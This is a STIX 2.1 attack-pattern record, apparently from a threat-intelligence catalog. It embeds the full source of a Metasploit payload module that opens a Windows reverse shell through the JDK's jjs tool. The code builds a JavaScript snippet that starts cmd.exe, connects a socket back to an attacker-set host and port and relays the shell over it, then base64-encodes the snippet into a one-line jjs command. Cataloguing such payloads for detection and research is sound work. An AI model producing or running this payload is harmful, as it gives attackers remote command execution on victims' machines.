{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0b589468-d5e9-4757-b637-9e96b9c2e4f0",
    "created": "2024-08-14T16:33:19.298713Z",
    "modified": "2024-08-14T16:33:19.298717Z",
    "name": "Windows Shell, Reverse TCP (via jjs)",
    "description": "Connect back and create a command shell via jjs",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/windows/jjs_reverse_tcp.rb",
            "external_id": "jjs_reverse_tcp.rb"
        },
        {
            "source_name": "reference",
            "url": "https://gtfobins.github.io/gtfobins/jjs/"
        },
        {
            "source_name": "reference",
            "url": "https://cornerpirate.com/2018/08/17/java-gives-a-shell-for-everything/"
        },
        {
            "source_name": "reference",
            "url": "https://h4wkst3r.blogspot.com/2018/05/code-execution-with-jdk-scripting-tools.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n  CachedSize = 867\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(\n      merge_info(\n        info,\n        'Name' => 'Windows Shell, Reverse TCP (via jjs)',\n        'Description' => 'Connect back and create a command shell via jjs',\n        'Author' => [\n          'conerpirate', # jjs reverse shell\n          'bcoles' # metasploit\n        ],\n        'References' => [\n          ['URL', 'https://gtfobins.github.io/gtfobins/jjs/'],\n          ['URL', 'https://cornerpirate.com/2018/08/17/java-gives-a-shell-for-everything/'],\n          ['URL', 'https://h4wkst3r.blogspot.com/2018/05/code-execution-with-jdk-scripting-tools.html']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => ARCH_CMD,\n        'Handler' => Msf::Handler::ReverseTcp,\n        'Session' => Msf::Sessions::CommandShell,\n        'PayloadType' => 'cmd',\n        'RequiredCmd' => 'jjs',\n        'Payload' => { 'Offsets' => {}, 'Payload' => '' }\n      )\n    )\n    register_options([\n      OptString.new('SHELL', [ true, 'The shell to execute.', 'cmd.exe' ]),\n      OptString.new('JJS_PATH', [true, 'The path to the JJS executable', 'jjs.exe'])\n    ])\n  end\n\n  def generate\n    return super + command_string\n  end\n\n  def command_string\n    lhost = datastore['LHOST']\n    lhost = \"[#{lhost}]\" if Rex::Socket.is_ipv6?(lhost)\n\n    jcode = %{\n      var ProcessBuilder=Java.type(\"java.lang.ProcessBuilder\");\n      var p=new ProcessBuilder(\"#{datastore['SHELL']}\").redirectErrorStream(true).start();\n      var ss=Java.type(\"java.net.Socket\");\n      var s=new ss(\"#{lhost}\",#{datastore['LPORT']});\n      var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n      var po=p.getOutputStream(),so=s.getOutputStream();\n      while(!s.isClosed()){\n        while(pi.available()>0)so.write(pi.read());\n        while(pe.available()>0)so.write(pe.read());\n        while(si.available()>0)po.write(si.read());\n        so.flush();\n        po.flush();\n        Java.type(\"java.lang.Thread\").sleep(50);\n        try{p.exitValue();break;}catch(e){}\n      };\n      p.destroy();s.close();\n    }\n    minified = jcode.split(\"\\n\").map(&:lstrip).join\n\n    %{echo eval(new java.lang.String(java.util.Base64.decoder.decode('#{Rex::Text.encode_base64(minified)}'))); | #{datastore['JJS_PATH']}}\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}